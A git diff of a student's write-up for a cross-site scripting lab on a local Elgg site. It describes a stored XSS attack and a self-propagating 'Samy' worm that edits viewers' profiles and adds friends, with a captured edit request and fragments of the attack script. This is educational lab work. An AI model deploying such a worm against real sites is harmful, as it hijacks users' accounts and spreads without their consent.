@@ -120,17 +120,7 @@ In this task, we are trying to modify other people's profile page if they view o
 POST /action/profile/edit HTTP/1.1
 Host: www.xsslabelgg.com
 Content-Length: 2536
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://www.xsslabelgg.com
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywTWFRbcqOckh4hVo
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://www.xsslabelgg.com/profile/samy/edit
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: Elgg=sir4peeb54gafb385vs1l6fnpt
-Connection: close
+...
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="__elgg_token"
 hlaPgUV7HjfhLOIUsQfU1Q
@@ -146,57 +136,13 @@ Content-Disposition: form-data; name="description"
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[description]"
 2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="briefdescription"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[briefdescription]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="location"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[location]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="interests"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[interests]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="skills"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[skills]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="contactemail"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[contactemail]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="phone"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[phone]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="mobile"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[mobile]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="website"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[website]"
-2
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="twitter"
-------WebKitFormBoundarywTWFRbcqOckh4hVo
-Content-Disposition: form-data; name="accesslevel[twitter]"
-2
+...
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="guid"
 59
 ------WebKitFormBoundarywTWFRbcqOckh4hVo--
 ```
-
+For full [Request](Task5.txt). From this, I found the action path /action/profile/edit, how the information contains the description and the accesslevel[description], and all of the levels are 2. Therefore, I messed around and constructed the following url and content information:
 ```
 <script type="text/javascript">
 window.onload = function(){
@@ -223,11 +169,27 @@ window.onload = function(){
     }
 }
 </script>
-
 ```
+Since the token and time stamp is needed for every connection, I included it in the content, then the name of the user that I have followed by what I named desc, which is the description and accesslevel[description], followed by the guid. The url is the same just with another path to the edit action. Then I included that in text mode of about me:
+![attack](Task5-1-1.PNG)
 
+After writing the code in Samy's profile, I logged in as Alice and made sure that her [profile](Task5-1-2.PNG) is blank. Then I [searched](Task5-1-3.PNG) for Samy. When I came back to Alice's profile, I have the following:
+
+![success](Task5-2-1.PNG)
+
+I could see that Samy is my hero is located on Alice's profile even though all Alice did was view Samy's profile page. Thus, we can conclude that our attack was successful.
+
+##### Task 5.2:
+We need line (1) to ensure that Samy is not attacking himself. In the last task, we can see that Samy has friended himself and that is not an normal action a user can complete. In this case, since the worm is not self-propagating yet, if Samy attacks himself, it would remove his worm that he wrote, so anyone who comes after the attack will not be affected. Furthormore, you would not want to attack yourself anyways. In conclusion, line (1) will check the user's guid to make sure it is not Samy, to guarantee that Samy is not attacking himself. Then I removed the line to try the attack. First, I double checked to make sure [Samy](Task5-2-1.PNG) is not displaying the message. Then I updated the code in his profile:
+![attack](Task5-2-2.PNG)
+
+When I saved it, [nothing happened](Task5-2-3.PNG); however, if I refresh the page, Samy's my hero is on Samy's profile:
+![success](Task5-2-4.PNG)
+![outcome](Task5-2-5.PNG)
+When I go into his profile, I can see that the code has been updated to the message, which means no one after that attack will be affected when they view Samy's page. Therefore, we neeed to check to make sure Samy is not attacking himself.
 
 ### Task 6:
+In this task, we are making a Samy worm. It includes all of the previous tasks and it copies itself to whoever views it. Which means it will spread itself more rapidly. This time, the skeleton of the code is provided, where it contains the headerTag, the tailTag, and copies every code to the body again. Regarding to the actual adding friend and updating about me, I am just copying what I have done before and duplicate the action where I want to have two GET request:
 ```
 <script type="text/javascript" id="worm">
 window.onload = function(){
@@ -272,43 +234,21 @@ window.onload = function(){
   }
 }
 ```
+Then I included the code in Samy's page:
+![attack](Task6-1.PNG)
 
+Then I logged in as Alice and made sure that her [file has not been attacked](Task6-2.PNG). Next, Alice will [search](Task6-3.PNG) for Samy. When Alice comes back to her profile, the worm has been injected into her profile:
+![successAlice1](Task6-4.PNG)
+![successAlice2](Task6-5.PNG)
 
-### Task 7:
+Then I logged in as Charlie and made sure that his [file has not been attacked](Task6-6.PNG). Next, Charlie will search for Alice:
+![searchAlice](Task6-7.PNG)
 
-##### Task 7.1:
+When Charlie comes back to his profile, the worm has been injected into his profile:
+![successCharlie1](Task6-8.PNG)
+![successCharlie2](Task6-9.PNG)
 
+Lastly, I logged in as Samy and checked who has friended him:
+![success](Task6-10.PNG)
 
-##### Task 7.2:
-
-
-##### Task 7.3:
-```
-# Purpose: Setting CSP policies in Apache configuration
-<VirtualHost *:80>
-    DocumentRoot /var/www/csp
-    ServerName www.example32b.com
-    DirectoryIndex index.html
-    Header set Content-Security-Policy " \
-             default-src 'self'; \
-             script-src 'self' *.example70.com *.example60.com \
-           "
-</VirtualHost>
-```
-
-
-##### Task 7.4:
-```
-<?php
-  $cspheader = "Content-Security-Policy:".
-               "default-src 'self';".
-               "script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' *.example70.com *.example60.com".
-               "";
-  header($cspheader);
-?>
-
-<?php include 'index.html';?>
-```
-
-
-##### Task 7.5:
+As we can see, although Charlie has never viewed Samy's page, because he viewed Alice, who has been affected with the worm, he will also be affected. Additionally, I have tried the link approach and it will work similarly. However, instead of storing the javascript code in About me, I will host that code on some website and use the About me to fetch that information. Overall, the worm seems very contagious since everyone without some kind of javascript blocker will be affected as soon as they view someone who has been affected by the worm. However, this worm has been interesting to study and pretty fun to do.
